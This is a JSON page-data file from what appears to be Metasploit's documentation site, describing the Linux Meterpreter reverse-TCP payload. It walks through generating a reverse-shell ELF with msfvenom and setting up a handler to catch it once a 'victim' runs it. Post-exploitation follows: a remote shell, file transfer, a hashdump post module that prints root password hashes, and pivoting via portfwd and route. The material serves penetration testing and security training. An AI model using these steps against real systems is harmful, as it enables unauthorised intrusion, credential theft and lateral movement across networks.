{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/payload/linux/x86/meterpreter/reverse_tcp","result":{"data":{"moduleMetadataJson":{"id":"c8262e83-2eea-5510-9f78-cd3cd5eadde3","name":"Linux Mettle x86, Reverse TCP Stager","fullname":"payload/linux/x86/meterpreter/reverse_tcp","description":"Inject the mettle server payload (staged). Connect back to the attacker","rank":300,"fields":{"detailsSlug":"/modules/details/payload/linux/x86/meterpreter/reverse_tcp","documentationSlug":"/modules/documentation/payload/linux/x86/meterpreter/reverse_tcp","referencesSlug":"/modules/references/payload/linux/x86/meterpreter/reverse_tcp"},"documentation":{"html":"<p>linux/x86/meterpreter/reverse_tcp is the most popular payload against the Linux platform. It allows\nyou to remotely take over the compromised system, having control of the file system, collect\nsensitive information such as credentials using post modules, etc.</p>\n<p>linux/x86/meterpreter/reverse_tcp is also the default payload for most Linux exploits.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>linux/x86/meterpreter/reverse_tcp should work on either 32 or 64-bit Linux platforms.</p>\n<h2 id=\"deploying-linuxx86meterpreterreverse_tcp\" style=\"position:relative;\"><a href=\"#deploying-linuxx86meterpreterreverse_tcp\" aria-label=\"deploying linuxx86meterpreterreverse_tcp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Deploying linux/x86/meterpreter/reverse_tcp</h2>\n<p>linux/x86/meterpreter/reverse_tcp can be used in two different ways.</p>\n<p><strong>As an exploit payload</strong></p>\n<p>Many Linux exploits support native payloads, but not always. To check this, you can use the <code class=\"language-text\">info</code>\ncommand on the exploit you want to use:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(lsa_transnames_heap) &gt; info\n\n       Name: Samba lsa_io_trans_names Heap Overflow\n     Module: exploit/linux/samba/lsa_transnames_heap\n   Platform: Linux\n Privileged: Yes\n    License: Metasploit Framework License (BSD)\n       Rank: Good\n  Disclosed: 2007-05-14\n...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>If the platform field includes Linux, then that means you can use linux/x86/meterpreter/reverse_tcp\nand other Linux payloads.</p>\n<p>Sometimes, you need to select a specific target to be able to use a native Linux payload. To check\nthis, do:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">show targets</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>If there is a Linux target, use that:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">set TARGET [index]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>To actually set the payload:</p>\n<ol>\n<li>In msfconsole, load the exploit.</li>\n<li>Do: <code class=\"language-text\">set PAYLOAD linux/x86/meterpreter/reverse_tcp</code></li>\n<li>Set the <code class=\"language-text\">LHOST</code> option, which is the <a href=\"https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">IP the payload should connect back to</a>.</li>\n<li>Run the exploit</li>\n</ol>\n<p><strong>As a standalone executable</strong></p>\n<p>To use linux/x86/meterpreter/reverse_tcp as an executable, first you can generate it with msfvenom:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">./msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f elf -o /tmp/payload.bin</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Before sending the executable to the victim machine, you need to set up the handler on your end:</p>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/multi/handler</code></li>\n<li>Do: <code class=\"language-text\">set PAYLOAD linux/x86/meterpreter/reverse_tcp</code></li>\n<li>Do: <code class=\"language-text\">set LHOST [Your IP]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<p>And that should start the listener. When the victim runs the malicious executable, you should\nreceive a session:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(handler) &gt; run\n\n[*] Started reverse TCP handler on 172.16.23.1:4444 \n[*] Starting the payload handler...\n[*] Transmitting intermediate stager for over-sized stage...(105 bytes)\n[*] Sending stage (1495599 bytes) to 172.16.23.182\n[*] Meterpreter session 1 opened (172.16.23.1:4444 -&gt; 172.16.23.182:45009) at 2016-07-06 22:40:35 -0500\n\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"important-basic-commands\" style=\"position:relative;\"><a href=\"#important-basic-commands\" aria-label=\"important basic commands permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Important Basic Commands</h2>\n<p>Here is a list of some of the common commands you might need while using the Linux Meterpreter:</p>\n<p><strong>pwd</strong></p>\n<p>The <code class=\"language-text\">pwd</code> command tells you the current working directory. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; pwd\n/home/sinn3r/Desktop</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>cd</strong></p>\n<p>The cd command allows you to change directories. Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; cd /tmp</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p><strong>cat</strong></p>\n<p>The cat command allows you to see the content of a file:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; cat /tmp/data.txt\nhello world</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>upload</strong></p>\n<p>The <code class=\"language-text\">upload</code> command allows you to upload a file to the remote target. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; upload /tmp/data.bin /home/sinn3r/Desktop\n[*] uploading  : /tmp/data.bin -&gt; /home/sinn3r/Desktop\n[*] uploaded   : /tmp/data.bin -&gt; /home/sinn3r/Desktop/data.bin\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>download</strong></p>\n<p>The <code class=\"language-text\">download</code> command allows you to download a file from the remote target to your machine. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; download /home/sinn3r/Desktop/data.bin /tmp\n[*] downloading: /home/sinn3r/Desktop/data.bin -&gt; /tmp/data.bin\n[*] download   : /home/sinn3r/Desktop/data.bin -&gt; /tmp/data.bin</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p><strong>ifconfig/ipconfig</strong></p>\n<p><code class=\"language-text\">ifconfig</code> and <code class=\"language-text\">ipconfig</code> are actually the same thing. They allow you to see the network\ninterfaces on the remote machine.</p>\n<p><strong>getuid</strong></p>\n<p>The <code class=\"language-text\">getuid</code> command tells you the current user that Meterpreter is running on. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; getuid\nServer username: uid=1000, gid=1000, euid=1000, egid=1000, suid=1000, sgid=1000</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>execute</strong></p>\n<p>The <code class=\"language-text\">execute</code> command allows you to execute a command or file on the remote machine.\nFor example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; execute -f echo -a &quot;hello &gt; /tmp/hello.txt&quot;\nProcess 5292 created.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>ps</strong></p>\n<p>The <code class=\"language-text\">ps</code> command lists the running processes on the remote machine.</p>\n<p><strong>shell</strong></p>\n<p>The <code class=\"language-text\">shell</code> command allows you to interact with the remote machine's terminal (or shell). For\nexample:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; shell\nProcess 5302 created.\nChannel 6 created.\n$</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>If you wish to get back to Meterpreter, do [CTRL]+[Z] to background the channel.</p>\n<p><strong>sysinfo</strong></p>\n<p>The <code class=\"language-text\">sysinfo</code> command shows you basic information about the remote machine. Such as:</p>\n<ul>\n<li>Computer name</li>\n<li>OS name</li>\n<li>Architecture</li>\n<li>Meterpreter type</li>\n</ul>\n<p>For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; sysinfo\nComputer     : sinn3r-virtual-machine\nOS           : Linux sinn3r-virtual-machine 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 (i686)\nArchitecture : i686\nMeterpreter  : x86/linux\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>Other commands</strong></p>\n<p>For a complete list of Linux Meterpreter commands, do the following at the prompt:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; help</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h2 id=\"using-a-post-module\" style=\"position:relative;\"><a href=\"#using-a-post-module\" aria-label=\"using a post module permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using a Post module</h2>\n<p>One of the best things about Meterpreter is you have access to a variety of post modules that\n\"shell\" sessions might not have. Post modules provide you with more capabilities to collect data\nfrom the remote machine automatically. For example, stealing credentials from the system or\nthird-party applications, or modify settings, etc.</p>\n<p>To use a post module from the Meterpreter prompt, simply use the <code class=\"language-text\">run</code> command. The following\nis an example of collecting Linux hashes using post/linux/gather/hashdump:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; run post/linux/gather/hashdump\n\n[+] root:$6$cq9dV0jD$DZNrPKKIzcJaJ1r1xzdePEJTzn5f2V5lm9CnSdkMRPJfYy7QVx2orpzlf1XXBbIRZs7kT9CmYEMApfUIrWZsj/:0:0:root:/root:/bin/bash\n[+] sinn3r:$6$S5lRz0Ji$bS0rOko3EVsAXwqR1rNcE/EhpnezmKH08Yioxyz/gLZAGh3AoyV5qCglvHx.vSINJNqs1.xhJix3pWX7jw8n0/:1000:1000:sinn3r,,,:/home/sinn3r:/bin/bash\n[+] Unshadowed Password File: /Users/wchen/.msf4/loot/20160707112433_http_172.16.23.182_linux.hashes_845236.txt\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Note that in order to collect Linux hashes, Meterpreter needs to run as root.</p>\n<h2 id=\"using-the-post-exploitation-api-in-irb\" style=\"position:relative;\"><a href=\"#using-the-post-exploitation-api-in-irb\" aria-label=\"using the post exploitation api in irb permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using the Post Exploitation API in IRB</h2>\n<p>To enter IRB, do the following at the Meterpreter prompt:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; irb\n[*] Starting IRB shell\n[*] The &#39;client&#39; variable holds the meterpreter client\n\n&gt;&gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>The client object</strong></p>\n<p>The client object in Meterpreter allows you to control or retrieve information about the host. For\nexample, this allows you to get the current privilege our payload is running as:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&gt;&gt; client.sys.config.getuid\n=&gt; &quot;uid=1000, gid=1000, euid=1000, egid=1000, suid=1000, sgid=1000&quot;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>To explore the client object, there are a few tricks. For example, you can use the #inspect method\nto inspect it:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&gt;&gt; client.inspect</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>You can also use the #methods method to see what methods you can use:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&gt;&gt; client.methods</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>To review the source of the method, you can use the #source_location method. For example, say we\nwant to see the source code for the #getuid method:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&gt;&gt; client.sys.config.method(:getuid).source_location\n=&gt; [&quot;/Users/sinn3r/rapid7/msf/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb&quot;, 32]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>The first element of the array is the location of the file. The second is the line number of the\nmethod.</p>\n<h2 id=\"routing-through-the-portfwd-commands\" style=\"position:relative;\"><a href=\"#routing-through-the-portfwd-commands\" aria-label=\"routing through the portfwd commands permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Routing Through the portfwd Commands</h2>\n<p>The <code class=\"language-text\">portfwd</code> command allows you to talk to a remote service like it's local. For example, if you\ncannot talk to the blocked HTTP service remotely on the compromised host due to whatever reason,\nthen you can use portfwd to establish that tunnel:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; portfwd add -l 8000 -p 8000 -r 172.16.23.182\n[*] Local TCP relay created: :8000 &lt;-&gt; 172.16.23.182:8000</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>And then talk to it like it's a local service:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(http_version) &gt; run\n\n[*] 127.0.0.1:8000 SimpleHTTP/0.6 Python/2.7.6\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(http_version) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"routing-through-msfconsole\" style=\"position:relative;\"><a href=\"#routing-through-msfconsole\" aria-label=\"routing through msfconsole permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Routing Through msfconsole</h2>\n<p>The <code class=\"language-text\">route</code> command from the msf prompt can also be used like portfwd, but it also allows you\nto reach out to other networks that the compromised host is connected to.</p>\n<p>To use <code class=\"language-text\">route</code>, first look at the ipconfig/ifconfig output and determine your pivot point:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; ipconfig</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Make sure you know the subnet, netmask, and the Meterpreter/session ID. Return to the msf prompt, and establish that route:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; route add 192.168.1.0 255.255.255.0 1</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>At that point, you should have a working pivot. You can use other Metasploit modules to explore\nor exploit more hosts on the network, or use auxiliary/server/socks4a and <a href=\"http://proxychains.sourceforge.net/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Proxychains</a> to\nallow other third-party tools to do the same.</p>"}}},"pageContext":{"id":"c8262e83-2eea-5510-9f78-cd3cd5eadde3"}}}